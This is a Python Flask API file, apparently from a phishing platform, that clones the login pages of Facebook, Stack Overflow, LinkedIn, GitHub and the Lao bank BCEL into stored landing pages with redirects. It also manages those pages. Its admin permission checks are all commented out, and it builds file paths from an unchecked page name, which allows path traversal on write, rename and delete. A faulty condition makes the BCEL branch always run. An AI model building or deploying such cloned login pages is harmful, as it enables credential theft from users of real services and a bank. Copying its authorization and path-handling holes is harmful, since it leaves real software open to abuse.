from datetime import datetime
from pathlib import Path
import requests
import os
from flask import request, jsonify, make_response
from flask_restx import Resource, fields, Namespace
from flask_jwt_extended import get_jwt, jwt_required
from clone.auto_clone import (
    modify_html_facebook,
    modify_html_stackoverflow,
    modify_html_linkedin,
    modify_html_github,
    modify_html_bcel,
    create_landing
)

from utils.format_data import read_file, write_file, escape_html, unescape_html

from constans.http_status_code import (
    HTTP_200_OK,
    HTTP_201_CREATED,
    HTTP_400_BAD_REQUEST,
    HTTP_404_NOT_FOUND,
    HTTP_409_CONFLICT,
)
from api.models import Page, db

landing_page_ns = Namespace("landing_page", description="Landing Page operations")

landing_page_model = landing_page_ns.model(
    "Page",
    {
        "name": fields.String(),
        "URL": fields.String(),
        "RedirectUrl": fields.String(),
        "html": fields.String(),
    },
)


def check_admin_permission():
    jwt = get_jwt()
    if jwt["role"] != "admin":
        return make_response(
            jsonify({"msg": "Permission denied"}), HTTP_400_BAD_REQUEST
        )


def validate_strip(profile_name, name):
    if profile_name.strip() == "":
        return make_response(
            jsonify({"msg": f"No {name} provided"}), HTTP_400_BAD_REQUEST
        )


@landing_page_ns.route("/")
class LandingManagments(Resource):
    @jwt_required()
    @landing_page_ns.expect(landing_page_model)
    def post(self):
        # permission_check = check_admin_permission()
        # if permission_check:
        #     return permission_check

        data = request.get_json()
        land_name = data.get("page_name")
        url = data.get("url")
        redirectUrl = data.get("redirectURL")
        html_data = data.get("html_data")

        # path
        base_dir = (
            Path(__file__).resolve().parent.parent
        )  # This gets the base directory (2 levels up from api)
        directory = base_dir / "templates"
        html_file = f"{land_name}.html"
        file_path = str(directory / html_file)

        # validate empty fields
        validate_name = validate_strip(land_name, "page name")
        if validate_name:
            return validate_name

        if url.strip() == "" and html_data.strip() == "":
            return make_response(
                jsonify({"msg": "URL to clone or HTML data not provided"}),
                HTTP_400_BAD_REQUEST,
            )
        if url and html_data:
            return make_response(
                jsonify({"msg": "Invalid both, choose one (URL or HTML)"}),
                HTTP_400_BAD_REQUEST,
            )
        if url.strip() != "" and redirectUrl.strip() == "":
            return make_response(
                jsonify({"msg": "No redirect URL provided"}), HTTP_400_BAD_REQUEST
            )
        if redirectUrl.strip() != "" and html_data:
            return make_response(
                jsonify({"msg": "Do not provied redirect URL "}), HTTP_400_BAD_REQUEST
            )

        db_landing = db.session.query(Page).filter_by(path=file_path).first()
        if db_landing:
            return make_response(
                jsonify({"msg": "Landing name already taken"}), HTTP_409_CONFLICT
            )

        # auto URL Clone
        if url.strip() != "" and redirectUrl.strip() != "" and not html_data:
            if (
                url == "https://www.facebook.com/"
                or url == "https://en-gb.facebook.com/"
            ):
                file_path = modify_html_facebook(url, file_path, redirectUrl)
                if file_path is None:
                    return make_response(
                        jsonify({"msg": "Created failed"}), HTTP_400_BAD_REQUEST
                    )
            elif url == "https://stackoverflow.com/users/login":
                file_path = modify_html_stackoverflow(url, file_path, redirectUrl)
                if file_path is None:
                    return make_response(
                        jsonify({"msg": "Created failed"}), HTTP_400_BAD_REQUEST
                    )
            elif url == "https://www.linkedin.com/login":
                file_path = modify_html_linkedin(url, file_path, redirectUrl)
                if file_path is None:
                    return make_response(
                        jsonify({"msg": "Created failed"}), HTTP_400_BAD_REQUEST
                    )
            elif url == "https://github.com/login":
                file_path = modify_html_github(url, file_path, redirectUrl)
                if file_path is None:
                    return make_response(
                        jsonify({"msg": "Created failed"}), HTTP_400_BAD_REQUEST
                    )
            elif url == "https://bcel.la:8083/" or "https://bcel.la:8083" or "https://www.bcel.com.la:8083/index.php?lang=0":
                file_path = modify_html_bcel(url, file_path, redirectUrl)
                if file_path is None:
                    return make_response(
                        jsonify({"msg": "Created failed"}), HTTP_400_BAD_REQUEST
                    )
            else:
                file_path = create_landing(url, file_path)
                if file_path is None:
                    return make_response(
                        jsonify({"msg": "Created failed"}), HTTP_400_BAD_REQUEST
                    )

        # Manual clone
        if html_data.strip() != "" and not url and not redirectUrl:
            # Do not escape Becuase it is already escaped from frontend
            write_file(file_path, html_data)

        new_landing = Page(path=file_path)
        db.session.add(new_landing)
        db.session.commit()

        return make_response(jsonify({"msg": "Landing Page Created"}), HTTP_201_CREATED)

    @jwt_required()
    def get(self):
        # permission_check = check_admin_permission()
        # if permission_check:
        #     return permission_check

        db_landing = db.session.query(Page).all()
        data = []

        for landing in db_landing:
            file_path = landing.path
            htmt_data = read_file(file_path)
            file_name = os.path.basename(file_path)

            if landing.modified_date:
                modified_date = landing.modified_date.strftime("%Y-%m-%d")
            else:
                modified_date = None

            data.append(
                {
                    "id": landing.page_id,
                    "page_name": file_name[:-5],
                    "modified_date": modified_date,
                    "html_data": htmt_data,
                }
            )

        return make_response(jsonify({"landing_page": data}), HTTP_200_OK)


@landing_page_ns.route("/<int:id>")
class LandingManagment(Resource):

    @jwt_required()
    def delete(self, id):
        # permission_check = check_admin_permission()
        # if permission_check:
        #     return permission_check

        db_landing = db.session.query(Page).filter_by(page_id=id).first()
        if not db_landing:
            return make_response(
                jsonify({"msg": "Landing Page not found"}), HTTP_404_NOT_FOUND
            )

        file_path = db_landing.path
        os.remove(file_path)

        db.session.delete(db_landing)
        db.session.commit()

        return make_response(jsonify({"msg": "Landing Page Deleted"}), HTTP_200_OK)

    @jwt_required()
    def put(self, id):
        # permission_check = check_admin_permission()
        # if permission_check:
        #     return permission_check

        data = request.get_json()
        land_name = data.get("page_name")
        URL = data.get("url")
        RedirectUrl = data.get("redirectUrl")
        html = data.get("html_data")

        # path
        base_dir = (
            Path(__file__).resolve().parent.parent
        )  # This gets the base directory (2 levels up from api)
        directory = base_dir / "templates"
        html_file = f"{land_name}.html"
        file_path = directory / html_file

        db_landing = db.session.query(Page).filter_by(page_id=id).first()

        if not db_landing:
            return make_response(
                jsonify({"msg": "Landing Page not found"}), HTTP_404_NOT_FOUND
            )

        if (URL and URL.strip() != "") and (RedirectUrl and RedirectUrl.strip() != ""):
            return make_response(
                jsonify({"msg": "Do not provied URL and RedirectURL"}),
                HTTP_400_BAD_REQUEST,
            )

        if (html is None or html.strip() == "") and land_name:
            db_land = (
                db.session.query(Page)
                .filter(Page.path == str(file_path), Page.page_id != id)
                .first()
            )
            if db_land:
                return make_response(
                    jsonify({"msg": "Landing name already taken"}), HTTP_200_OK
                )

            old_file_path = db_landing.path
            if old_file_path and os.path.exists(old_file_path):
                os.rename(old_file_path, file_path)

            current_datetime = datetime.now()

            db_landing.path = str(file_path)
            db_landing.modified_date = current_datetime
            db.session.commit()

            return make_response(jsonify({"msg": "Landing Page Updated"}), HTTP_200_OK)

        validate_html = validate_strip(html, "html")
        if validate_html:
            return validate_html

        if html and land_name:
            old_file_path = db_landing.path
            if old_file_path and os.path.exists(old_file_path):
                write_file(old_file_path, html)
                os.rename(old_file_path, file_path)

        current_datetime = datetime.now()
        db_landing.path = str(file_path)
        db_landing.modified_date = current_datetime
        db.session.commit()

        return make_response(jsonify({"msg": "Landing Page Updated"}), HTTP_200_OK)

    @jwt_required()
    def get(self, id):
        # permission_check = check_admin_permission()
        # if permission_check:
        #     return permission_check

        db_landing = db.session.query(Page).filter_by(page_id=id).first()

        if not db_landing:
            return make_response(
                jsonify({"msg": "Landing Page not found"}), HTTP_404_NOT_FOUND
            )

        html_contect = read_file(db_landing.path)
        data = []
        file_path = db_landing.path
        file_name = os.path.basename(file_path)
        data.append(
            {
                "id": db_landing.page_id,
                "name": file_name[:-5],
                "html_data": html_contect,
            }
        )

        return make_response(jsonify({"html": data}), HTTP_200_OK)